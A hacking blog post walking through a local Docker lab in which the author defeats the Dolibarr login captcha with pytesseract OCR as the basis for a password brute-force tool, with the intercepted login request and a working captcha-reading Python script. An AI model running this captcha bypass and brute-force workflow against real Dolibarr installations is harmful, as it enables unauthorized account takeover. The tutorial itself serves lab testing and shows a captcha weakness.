<!DOCTYPE html><html lang="en" data-mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Bypass captcha using OCR on Dolibarr login page" /><meta name="author" content="BaadMaro" /><meta property="og:locale" content="en" /><meta name="description" content="Today i’m going to explain how i was able to bypass captcha using OCR on Dolibarr login page, and create a script for it." /><meta property="og:description" content="Today i’m going to explain how i was able to bypass captcha using OCR on Dolibarr login page, and create a script for it." /><link rel="canonical" href="https://baadmaro.github.io/posts/Bypass-captcha-using-OCR-on-Dolibarr-login-page/" /><meta property="og:url" content="https://baadmaro.github.io/posts/Bypass-captcha-using-OCR-on-Dolibarr-login-page/" /><meta property="og:site_name" content="BaadMaro" /><meta property="og:image" content="https://baadmaro.github.io/assets/img/posts/dolibrute.png" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-08-01T00:00:00+00:00" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="https://baadmaro.github.io/assets/img/posts/dolibrute.png" /><meta property="twitter:title" content="Bypass captcha using OCR on Dolibarr login page" /><meta name="twitter:site" content="@twitter_username" /><meta name="twitter:creator" content="@BaadMaro" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"BaadMaro"},"dateModified":"2023-03-16T16:20:03+00:00","datePublished":"2022-08-01T00:00:00+00:00","description":"Today i’m going to explain how i was able to bypass captcha using OCR on Dolibarr login page, and create a script for it.","headline":"Bypass captcha using OCR on Dolibarr login page","image":"https://baadmaro.github.io/assets/img/posts/dolibrute.png","mainEntityOfPage":{"@type":"WebPage","@id":"https://baadmaro.github.io/posts/Bypass-captcha-using-OCR-on-Dolibarr-login-page/"},"url":"https://baadmaro.github.io/posts/Bypass-captcha-using-OCR-on-Dolibarr-login-page/"}</script><title>Bypass captcha using OCR on Dolibarr login page | BaadMaro</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="BaadMaro"><meta name="application-name" content="BaadMaro"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" class="mx-auto"> <img src="/assets/img/avatar/profile.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">BaadMaro</a></div><div class="site-subtitle font-italic">My journey into hacking</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/BaadMaro" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href="" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Bypass captcha using OCR on Dolibarr login page</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Bypass captcha using OCR on Dolibarr login page</h1><div class="post-meta text-muted"> <span> Posted <em class="" data-ts="1659312000" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Aug 1, 2022 </em> </span> <span> Updated <em class="" data-ts="1678983603" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Mar 16, 2023 </em> </span><div class="d-flex justify-content-between"> <span> By <em> BaadMaro </em> </span><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1838 words"> <em>10 min</em> read</span></div></div></div><div class="post-content"> <img data-src="/assets/img/posts/dolibrute.png" class="post-preview-img" data-proofer-ignore><p>Today i’m going to explain how i was able to bypass captcha using OCR on Dolibarr login page, and create a script for it.</p><p>Output :</p><ul><li>I published the tool with the name DoliBrute. I’ll work on it for more updates</ul><p><a href="https://github.com/BaadMaro/DoliBrute">https://github.com/BaadMaro/DoliBrute</a></p><h1 id="dolibarr">Dolibarr</h1><p>Dolibarr ERP CRM is a modern software package to manage your company or foundation’s activity (contacts, suppliers, invoices, orders, stocks, agenda, accounting, …). It is open source software (written in PHP) and designed for small and medium businesses, foundations and freelancers.</p><ul><li>Website : <a href="https://www.dolibarr.org/">https://www.dolibarr.org/</a><li>Github : <a href="https://github.com/Dolibarr/dolibarr">https://github.com/Dolibarr/dolibarr</a></ul><h1 id="setup-a-lab-for-testing">Setup a lab for testing</h1><p>There is many ways to install Dolibarr to be able to interact with it :</p><ul><li>Simple installation : you can download packaged versions from your system <a href="https://www.dolibarr.org/downloads.php">https://www.dolibarr.org/downloads.php</a><li>Advance installation : Build from source and setup the web server and datatbase <a href="https://github.com/Dolibarr/dolibarr#advanced-setup">https://github.com/Dolibarr/dolibarr#advanced-setup</a><li>Docker : We can call it the gigchad method. If you don’t know anything about docker you can check <a href="https://www.youtube.com/watch?v=iqqDU2crIEQ">https://www.youtube.com/watch?v=iqqDU2crIEQ</a>.</ul><p><code class="language-plaintext highlighter-rouge">Docker is an open platform for developing, shipping, and running applications. Docker enables you to separate your applications from your infrastructure so you can deliver software quickly.</code></p><p>There is a docker image for Dolibarr created by <a href="https://hub.docker.com/u/tuxgasy">tuxgasy</a> <a href="https://hub.docker.com/r/tuxgasy/dolibarr">https://hub.docker.com/r/tuxgasy/dolibarr</a></p><h1 id="dolibarr-installation-with-docker">Dolibarr installation with Docker</h1><p>Before you continue, you should install Docker on your system. We’re going to also need docker-compose <a href="https://docs.docker.com/get-docker/">https://docs.docker.com/get-docker/</a></p><p>For me, I was using Kali Linux <a href="https://www.kali.org/docs/containers/installing-docker-on-kali/">https://www.kali.org/docs/containers/installing-docker-on-kali/</a> </p><p>I started by pulling the Dolibarr Docker image.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>docker pull tuxgasy/dolibarr
</pre></table></code></div></div><p>After finishing, let’s check the available images</p><p><img data-src="https://user-images.githubusercontent.com/72421091/182227170-14e28c14-4bcb-4f9d-98a8-a9c3c9405063.png" alt="Pasted image 20220731215831" data-proofer-ignore></p><p>This docker image dosen’t include the database. So we need to create a docker container for the datatabse.</p><p>I’m going to create a file called docker-compose.yml to setup datatabse and dolibarr</p><div class="language-yaml highlighter-rouge"><div class="code-header"> <span data-label-text="YAML"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre><td class="rouge-code"><pre><span class="na">version</span><span class="pi">:</span> <span class="s2">"</span><span class="s">3"</span>

<span class="na">services</span><span class="pi">:</span>
    <span class="na">mariadb</span><span class="pi">:</span>
        <span class="na">image</span><span class="pi">:</span> <span class="s">mariadb:latest</span>
        <span class="na">environment</span><span class="pi">:</span>
            <span class="na">MYSQL_ROOT_PASSWORD</span><span class="pi">:</span> <span class="s">root</span>
            <span class="na">MYSQL_DATABASE</span><span class="pi">:</span> <span class="s">dolibarr</span>

    <span class="na">web</span><span class="pi">:</span>
        <span class="na">image</span><span class="pi">:</span> <span class="s">tuxgasy/dolibarr</span>
        <span class="na">environment</span><span class="pi">:</span>
            <span class="na">DOLI_DB_HOST</span><span class="pi">:</span> <span class="s">mariadb</span>
            <span class="na">DOLI_DB_USER</span><span class="pi">:</span> <span class="s">root</span>
            <span class="na">DOLI_DB_PASSWORD</span><span class="pi">:</span> <span class="s">root</span>
            <span class="na">DOLI_DB_NAME</span><span class="pi">:</span> <span class="s">dolibarr</span>
            <span class="na">DOLI_URL_ROOT</span><span class="pi">:</span> <span class="s1">'</span><span class="s">http://0.0.0.0'</span>
            <span class="na">PHP_INI_DATE_TIMEZONE</span><span class="pi">:</span> <span class="s1">'</span><span class="s">Europe/Paris'</span>
        <span class="na">ports</span><span class="pi">:</span>
            <span class="pi">-</span> <span class="s2">"</span><span class="s">80:80"</span>
        <span class="na">links</span><span class="pi">:</span>
            <span class="pi">-</span> <span class="s">mariadb</span>
</pre></table></code></div></div><p>Now we need to start the services using the docker-compose command.</p><p><img data-src="https://user-images.githubusercontent.com/72421091/182227254-4208c7eb-9ef0-444c-8aaf-bd9c531c919f.png" alt="Pasted image 20220731220332" data-proofer-ignore></p><p>We can see our containers running using <code class="language-plaintext highlighter-rouge">docker ps</code></p><p><img data-src="https://user-images.githubusercontent.com/72421091/182227375-1c2d3a2c-1ed9-4e9e-a7a9-0438fd4cb65f.png" alt="Pasted image 20220801145814" data-proofer-ignore></p><p>Let’s go to <a href="http://0.0.0.0/">http://0.0.0.0</a> (or your machine ip) to access the new Dolibarr installation.</p><p><img data-src="https://user-images.githubusercontent.com/72421091/182227433-64d74630-1bc3-4ca6-9f74-afd3735fadad.png" alt="Pasted image 20220731220734" data-proofer-ignore></p><p>As we can see, our web server is up. Now let’s login using admin:admin and activate captcha on the login page.</p><p><img data-src="https://user-images.githubusercontent.com/72421091/182227464-33b03584-f336-4c7b-b010-0df0c2c34427.png" alt="Pasted image 20220731220657" data-proofer-ignore></p><p>If we logout and check the login page now, we can see the new captcha.</p><p><img data-src="https://user-images.githubusercontent.com/72421091/182227529-fd6dcd58-5168-4f79-b61f-bd976476851f.png" alt="Pasted image 20220731220803" data-proofer-ignore></p><h1 id="understand-the-login-mecanism">Understand the login mecanism</h1><p>I’m going to use burpsuite as a proxy to intercept requests.</p><p>Let’s test the login request.</p><p><img data-src="https://user-images.githubusercontent.com/72421091/182227601-e1a9a9fb-799f-4286-879a-5294c426f3f9.png" alt="Pasted image 20220731221618" data-proofer-ignore></p><ul><li>Request :</ul><div class="language-http highlighter-rouge"><div class="code-header"> <span data-label-text="Http"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre><span class="nf">POST</span> <span class="nn">/index.php?mainmenu=home</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">192.168.1.110</span>
<span class="na">Content-Length</span><span class="p">:</span> <span class="s">377</span>
<span class="na">Cache-Control</span><span class="p">:</span> <span class="s">max-age=0</span>
<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>
<span class="na">Origin</span><span class="p">:</span> <span class="s">http://192.168.1.110</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/x-www-form-urlencoded</span>
<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36</span>
<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span>
<span class="na">Referer</span><span class="p">:</span> <span class="s">http://192.168.1.110/</span>
<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.9</span>
<span class="na">Cookie</span><span class="p">:</span> <span class="s">DOLSESSID_88d498d64b60efb4af60751a059c59a1=gko4agq9j65qvqui7fe3snpdl6; DOLSESSTIMEOUT_88d498d64b60efb4af60751a059c59a1=1440</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>

token=3f061ddd3d625668740705559ebd19ce&amp;actionlogin=login&amp;loginfunction=loginfunction&amp;tz=1&amp;tz_string=Africa%2FCasablanca&amp;dst_observed=0&amp;dst_first=2022-05-8T01%3A59%3A00Z&amp;dst_second=2022-03-27T02%3A59%3A00Z&amp;screenwidth=1038&amp;screenheight=718&amp;dol_hide_topmenu=&amp;dol_hide_leftmenu=&amp;dol_optimize_smallscreen=&amp;dol_no_mouse_hover=&amp;dol_use_jmobile=&amp;username=test&amp;password=test&amp;code=3Kmw6
</pre></table></code></div></div><p>As we can see the login page send a post request to <code class="language-plaintext highlighter-rouge">/index.php?mainmenu=home</code> with a data payload. It’s has a token, our login username and password, the captcha code and some variables. We can see also a DOLSEESID cookie in the request.</p><p>We can see the error message after forwarding the request.</p><p><img data-src="https://user-images.githubusercontent.com/72421091/182227777-fff8c414-4b7a-4dbb-b90b-1c0ad8eca994.png" alt="Pasted image 20220731222002" data-proofer-ignore></p><h1 id="where-is-the-token-">Where is the token ?</h1><p>&lt;view-source:http://192.168.1.110/index.php?mainmenu=home&gt;</p><p>If we check the source page, we see the used token a also some variables.</p><div class="language-html highlighter-rouge"><div class="code-header"> <span data-label-text="HTML"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
</pre><td class="rouge-code"><pre><span class="nt">&lt;form</span> <span class="na">id=</span><span class="s">"login"</span> <span class="na">name=</span><span class="s">"login"</span> <span class="na">method=</span><span class="s">"post"</span> <span class="na">action=</span><span class="s">"/index.php?mainmenu=home"</span><span class="nt">&gt;</span>

<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"token"</span> <span class="na">value=</span><span class="s">"3f061ddd3d625668740705559ebd19ce"</span> <span class="nt">/&gt;</span>

<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"actionlogin"</span> <span class="na">value=</span><span class="s">"login"</span><span class="nt">&gt;</span>

<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"loginfunction"</span> <span class="na">value=</span><span class="s">"loginfunction"</span> <span class="nt">/&gt;</span>

<span class="c">&lt;!-- Add fields to store and send local user information. This fields are filled by the core/js/dst.js --&gt;</span>

<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"tz"</span> <span class="na">id=</span><span class="s">"tz"</span> <span class="na">value=</span><span class="s">""</span> <span class="nt">/&gt;</span>

<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"tz_string"</span> <span class="na">id=</span><span class="s">"tz_string"</span> <span class="na">value=</span><span class="s">""</span> <span class="nt">/&gt;</span>

<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"dst_observed"</span> <span class="na">id=</span><span class="s">"dst_observed"</span> <span class="na">value=</span><span class="s">""</span> <span class="nt">/&gt;</span>

<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"dst_first"</span> <span class="na">id=</span><span class="s">"dst_first"</span> <span class="na">value=</span><span class="s">""</span> <span class="nt">/&gt;</span>

<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"dst_second"</span> <span class="na">id=</span><span class="s">"dst_second"</span> <span class="na">value=</span><span class="s">""</span> <span class="nt">/&gt;</span>

<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"screenwidth"</span> <span class="na">id=</span><span class="s">"screenwidth"</span> <span class="na">value=</span><span class="s">""</span> <span class="nt">/&gt;</span>

<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"screenheight"</span> <span class="na">id=</span><span class="s">"screenheight"</span> <span class="na">value=</span><span class="s">""</span> <span class="nt">/&gt;</span>

<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"dol_hide_topmenu"</span> <span class="na">id=</span><span class="s">"dol_hide_topmenu"</span> <span class="na">value=</span><span class="s">""</span> <span class="nt">/&gt;</span>

<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"dol_hide_leftmenu"</span> <span class="na">id=</span><span class="s">"dol_hide_leftmenu"</span> <span class="na">value=</span><span class="s">""</span> <span class="nt">/&gt;</span>

<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"dol_optimize_smallscreen"</span> <span class="na">id=</span><span class="s">"dol_optimize_smallscreen"</span> <span class="na">value=</span><span class="s">""</span> <span class="nt">/&gt;</span>

<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"dol_no_mouse_hover"</span> <span class="na">id=</span><span class="s">"dol_no_mouse_hover"</span> <span class="na">value=</span><span class="s">""</span> <span class="nt">/&gt;</span>

<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"dol_use_jmobile"</span> <span class="na">id=</span><span class="s">"dol_use_jmobile"</span> <span class="na">value=</span><span class="s">""</span> <span class="nt">/&gt;</span>
</pre></table></code></div></div><p>After refreshing the page, we see the same value. So maybe it’s fixed.</p><div class="language-html highlighter-rouge"><div class="code-header"> <span data-label-text="HTML"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"token"</span> <span class="na">value=</span><span class="s">"3f061ddd3d625668740705559ebd19ce"</span> <span class="nt">/&gt;</span>
</pre></table></code></div></div><h1 id="login-bruteforce-workflow">Login bruteforce workflow</h1><p>Now we are going to start building our script to bypass the captcha code. Here is the workflow : </p><ul><li>Grab the token from the page in each request.<li>Find a way to read captcha code from the image using OCR.<li>Find the test cases for wrong login, wrong captcha code, and successful login.<li>Build the post request using the variables and custom username and password.</ul><h1 id="extract-captcha-code-using-ocr">Extract captcha code using OCR</h1><p>For our captcha code, It’s loaded from a php file</p><div class="language-html highlighter-rouge"><div class="code-header"> <span data-label-text="HTML"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nt">&lt;img</span> <span class="na">class=</span><span class="s">"inline-block valignmiddle"</span> <span class="na">src=</span><span class="s">"/core/antispamimage.php"</span> <span class="na">border=</span><span class="s">"0"</span> <span class="na">width=</span><span class="s">"80"</span> <span class="na">height=</span><span class="s">"32"</span> <span class="na">id=</span><span class="s">"img_securitycode"</span> <span class="nt">/&gt;</span>
</pre></table></code></div></div><p><a href="http://192.168.1.110/core/antispamimage.php">http://192.168.1.110/core/antispamimage.php</a></p><p><img data-src="https://user-images.githubusercontent.com/72421091/182227943-e2b5ab45-5db4-49f7-b25a-c2172807afd4.png" alt="Pasted image 20220731222938" data-proofer-ignore></p><p>In each call to this file, a new valid captcha is generated. It’s the same mechanism available on the login page with the refresh icon.</p><p><img data-src="https://user-images.githubusercontent.com/72421091/182227952-f8066210-1358-42d3-95f5-d7892082d7e5.png" alt="Pasted image 20220731223038" data-proofer-ignore></p><p>To be able to extract characters from captcha image. I’ll use Python-tesseract <a href="https://pypi.org/project/pytesseract/">https://pypi.org/project/pytesseract/</a></p><p><code class="language-plaintext highlighter-rouge">Python-tesseract is a python wrapper for Google's Tesseract-OCR</code></p><p>We need to install Tesseract-OCR first before using it with python <a href="https://tesseract-ocr.github.io/tessdoc/Home.html">https://tesseract-ocr.github.io/tessdoc/Home.html</a></p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>Optical Character Recognition (OCR) is the process of detecting and reading text in images through computer vision. 
</pre></table></code></div></div><p>For Kali Linux</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nb">sudo </span>apt-get <span class="nb">install </span>tesseract-ocr
pip3 <span class="nb">install </span>pytesseract
</pre></table></code></div></div><p>My script to get OCR the captcha code from the image using OCR</p><ul><li>core/antispamimage.php : give us the image. As i captured using python requests, i got the bytes. You can see the file header with 89 PNG. It’s the png file header.<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>b'\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00P\x00\x00\x00 \x01\x03\x00\x00\x00\xbf\xfdm/\x00\x00\x00\x06PLTE\xfa\xfa\xfa\x00\x00\x00\xfa1=\x8f\x00\x00\x00\tpHYs\x00\x00\x0e\xc4\x00\x00\x0e\xc4\x01\x95+\x0e\x1b\x00\x00\x00JIDAT\x18\x95c`\x18@`\xc3\xc0\xc0\xe2\x00a:10\xf0 \x98"0f\x8c\x8dJ\x0c\x84i\x97\xe4\xe4\x92\x04a299\xb88\xc1\x986up&amp;\x13\x0b\x94\xc9\x92\xe4\xc4\x02Uk\x11c\xc3\x025\x81\xc1\x01a3v&amp;\r\x00\x00\xb3\xa2\n[Z\xaf@L\x00\x00\x00\x00IEND\xaeB`\x82'
</pre></table></code></div></div><li>Now we need to save the bytes as an image. I’ll use BytesIO from the module io tosame our binary data to an image.<li>For the image interaction i worked with the library PIL. You can check the output of BytesIO with the image.show() to verify the output.<li>Now after building our image, i’ll use pytesseract with the option to get characters via OCR using image_to_string()<li>The OCR detection can give some wrong output, so we need to do our test to extract a valid captcha code. The valid captcha code is always 5 characters and has only alphanumeric alphanumeric characters.</ul><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
</pre><td class="rouge-code"><pre><span class="kn">from</span> <span class="nn">io</span> <span class="kn">import</span> <span class="n">BytesIO</span>
<span class="kn">import</span> <span class="nn">pytesseract</span>
<span class="kn">import</span> <span class="nn">random</span>
<span class="kn">from</span> <span class="nn">PIL</span> <span class="kn">import</span> <span class="n">Image</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">requests</span>
<span class="n">pytesseract</span><span class="p">.</span><span class="n">pytesseract</span><span class="p">.</span><span class="n">tesseract_cmd</span> <span class="o">=</span> <span class="s">"/usr/bin/tesseract"</span>

<span class="n">base_url</span> <span class="o">=</span> <span class="s">"http://192.168.1.110/"</span>

<span class="k">def</span> <span class="nf">get_captcha_code</span><span class="p">(</span><span class="n">base_url</span><span class="p">):</span>
    <span class="n">code</span> <span class="o">=</span> <span class="s">""</span>
    <span class="k">while</span> <span class="nb">len</span><span class="p">(</span><span class="n">code</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">5</span><span class="p">:</span>

        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">base_url</span><span class="si">}</span><span class="s">core/antispamimage.php"</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>

        
        <span class="n">img</span> <span class="o">=</span> <span class="n">Image</span><span class="p">.</span><span class="nb">open</span><span class="p">(</span><span class="n">BytesIO</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">content</span><span class="p">))</span>
        <span class="n">img</span><span class="p">.</span><span class="n">show</span><span class="p">()</span>
        <span class="n">code</span> <span class="o">=</span> <span class="n">pytesseract</span><span class="p">.</span><span class="n">image_to_string</span><span class="p">(</span><span class="n">img</span><span class="p">).</span><span class="n">split</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
        <span class="c1">#print(code)
</span>        <span class="k">for</span> <span class="n">char</span> <span class="ow">in</span> <span class="n">code</span><span class="p">:</span>
            <span class="k">if</span> <span class="n">char</span> <span class="ow">not</span> <span class="ow">in</span> <span class="s">"aAbBCDeEFgGhHJKLmMnNpPqQRsStTuVwWXYZz2345679"</span><span class="p">:</span>
                <span class="n">code</span> <span class="o">=</span> <span class="s">""</span>
                <span class="k">break</span>
    <span class="k">return</span> <span class="n">code</span>


<span class="k">print</span><span class="p">(</span><span class="n">get_captcha_code</span><span class="p">(</span><span class="n">base_url</span><span class="p">))</span>


